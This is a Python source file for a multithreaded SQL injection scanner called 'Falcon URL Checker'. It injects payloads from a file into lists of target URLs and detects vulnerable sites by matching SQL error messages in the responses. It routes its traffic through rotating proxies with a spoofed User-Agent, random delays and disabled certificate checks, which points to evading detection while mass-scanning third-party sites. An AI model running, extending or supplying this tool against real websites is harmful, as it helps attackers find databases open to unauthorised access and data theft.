import os
import sys
import random
import time
import re
import argparse
import curses
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.exceptions import ProxyError
import requests
import urllib3
from colorama import init, Fore
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=False)  # Initialize colorama without auto-reset


def print_banner(stdscr):
    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(0, 0, "Made with love by ")
    stdscr.attroff(curses.color_pair(1))
    
    stdscr.attron(curses.color_pair(2))
    stdscr.addstr(0, 18, "The Great Falcon")
    stdscr.attroff(curses.color_pair(2))
    
    stdscr.attron(curses.color_pair(2))
    stdscr.addstr(1, 0, "**********************************")
    stdscr.attroff(curses.color_pair(2))
    
    stdscr.refresh()

def update_statistics(stdscr, current_url, processed_urls, total_urls, injectable_count, start_time):
    elapsed_time = time.time() - start_time
    elapsed_minutes, elapsed_seconds = divmod(elapsed_time, 60)
    
    stdscr.addstr(4, 0, f"Current URL: {current_url}")
    stdscr.addstr(5, 0, f"Processed URLs: {processed_urls}/{total_urls}")
    stdscr.addstr(6, 0, f"Injectable URLs Found: {injectable_count}")
    stdscr.addstr(7, 0, f"Elapsed Time: {int(elapsed_minutes):02d}:{int(elapsed_seconds):02d}")
    stdscr.refresh()

def update_stats_periodically(stdscr, checker, delay=2):
    while True:
        time.sleep(delay)
        update_statistics(stdscr, checker.current_url, checker.processed_urls, checker.total_urls, checker.injectable_count, checker.start_time)



def handle_request_errors(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except requests.exceptions.RequestException as e:
            print(f"Error while sending request: {e}")
        except ProxyError as e:
            print(f"Error with proxy: {e}")
        except requests.exceptions.Timeout as e:
            print(f"Request timed out: {e}")
        except requests.exceptions.TooManyRedirects as e:
            print(f"Too many redirects: {e}")
        except requests.exceptions.SSLError as e:
            print(f"SSL/TLS error: {e}")
        except requests.exceptions.ConnectionError as e:
            print(f"Connection error: {e}")
        except Exception as e:
            print(f"Unexpected error: {e}")
        return None

    return wrapper


class SQLInjectionChecker:
    def __init__(self, proxy_list, timeout=10, payloads_file="payloads.txt", sql_patterns_file="sql-patterns.txt"):
        self.proxies = proxy_list
        self.timeout = timeout
        self.payloads = self._read_file(payloads_file)
        self.sql_errors = self._read_file(sql_patterns_file)
        self.current_url = ""
        self.processed_urls = 0
        self.total_urls = 0
        self.injectable_count = 0
        self.start_time = time.time()

    @staticmethod
    def _read_file(file_path):
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                return [line.strip() for line in f.readlines()]
        except IOError as e:
            print(f"Error reading file: {e}")
            sys.exit(1)

    @handle_request_errors
    def request_injected_url(self, injected_url, proxy, headers):
        return requests.get(injected_url, proxies={"http": proxy, "https": proxy}, headers=headers, timeout=self.timeout, verify=False)

    def get_random_proxy(self):
        return random.choice(self.proxies)

    def check_sql_injection(self, url, retries=3):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }

        for _ in range(retries):
            for payload in self.payloads:
                injected_url = url.replace("[t]", payload)
                proxy = self.get_random_proxy()

                print(f"Using proxy: {proxy} for URL: {injected_url}")

                response = self.request_injected_url(injected_url, proxy, headers)

                if response is not None:
                    for error in self.sql_errors:
                        if re.search(error, response.text, re.IGNORECASE):
                            return True

        return False


def check_url(url, checker, stdscr, min_delay, max_delay):
    time.sleep(random.uniform(min_delay, max_delay))
    is_injectable = checker.check_sql_injection(url)
    checker.current_url = url
    checker.processed_urls += 1
    if is_injectable:
        checker.injectable_count += 1

    update_statistics(stdscr, url, checker.processed_urls, checker.total_urls, checker.injectable_count, checker.start_time)
    return url if is_injectable else None


def read_proxies(proxy_file):
    return SQLInjectionChecker._read_file(proxy_file)


def load_urls(file_path):
    return SQLInjectionChecker._read_file(file_path)


def process_urls(urls, checker, stdscr, args):
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(lambda url: check_url(url, checker, stdscr, args.min_delay, args.max_delay), url) for url in urls]

        with tqdm(total=len(futures), bar_format="{percentage:3.0f}%|{bar}| {n}/{total}") as pbar:
            for future in as_completed(futures):
                try:
                    if future.exception() is not None:
                        print(f"Error processing URL: {future.exception()}")
                    elif future.result() is not None:
                        pbar.update(1)
                except Exception as e:
                    print(f"Error handling future: {e}")

        return [future.result() for future in futures if future.result() is not None]


def save_results(results, output_file):
    try:
        with open(output_file, "w") as f:
            for result in results:
                f.write(f"{result}\n")
    except IOError as e:
        print(f"Error writing to the output file: {e}")
        sys.exit(1)


def main(stdscr, args):
    # Clear the screen and turn off cursor
    stdscr.clear()
    curses.curs_set(0)

    # Initialize color pairs
    curses.init_pair(1, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_RED, curses.COLOR_BLACK)

    # Print the banner
    print_banner(stdscr)

    proxy_list = read_proxies(args.proxies)
    urls = load_urls(args.urls)

    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(2, 0, "SQL Patterns Loaded: ")
    stdscr.attroff(curses.color_pair(1))
    
    stdscr.attron(curses.color_pair(2))
    stdscr.addstr(2, 20, str(len(SQLInjectionChecker._read_file('sql-patterns.txt'))))
    stdscr.attroff(curses.color_pair(2))

    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(3, 0, "Payloads Loaded: ")
    stdscr.attroff(curses.color_pair(1))

    stdscr.attron(curses.color_pair(2))
    stdscr.addstr(3, 16, str(len(SQLInjectionChecker._read_file('payloads.txt'))))
    stdscr.attroff(curses.color_pair(2))

    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(4, 0, "URLs Loaded: ")
    stdscr.attroff(curses.color_pair(1))

    stdscr.attron(curses.color_pair(2))
    stdscr.addstr(4, 12, str(len(urls)))
    stdscr.attroff(curses.color_pair(2))

    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(5, 0, "Proxies Loaded: ")
    stdscr.attroff(curses.color_pair(1))

    stdscr.attron(curses.color_pair(2))
    stdscr.addstr(5, 15, str(len(proxy_list)))
    stdscr.attroff(curses.color_pair(2))

    stdscr.refresh()

    checker = SQLInjectionChecker(proxy_list)
    checker.total_urls = len(urls)

    # Start the stats update thread
    stats_thread = threading.Thread(target=update_stats_periodically, args=(stdscr, checker))
    stats_thread.daemon = True
    stats_thread.start()
    
    injectable_urls = process_urls(urls, checker, stdscr, args)

    save_results(injectable_urls, args.output)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Falcon URL Checker")
    parser.add_argument("-p", "--proxies", required=True, help="Path to the proxies file.")
    parser.add_argument("-u", "--urls", required=True, help="Path to the URLs file.")
    parser.add_argument("-o", "--output", required=True, help="Path to the output file.")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10).")
    parser.add_argument("--min-delay", type=float, default=0.5, help="Minimum delay between requests in seconds (default: 0.5).")
    parser.add_argument("--max-delay", type=float, default=1.5, help="Maximum delay between requests in seconds (default: 1.5).")

    args = parser.parse_args()

    curses.wrapper(main, args)
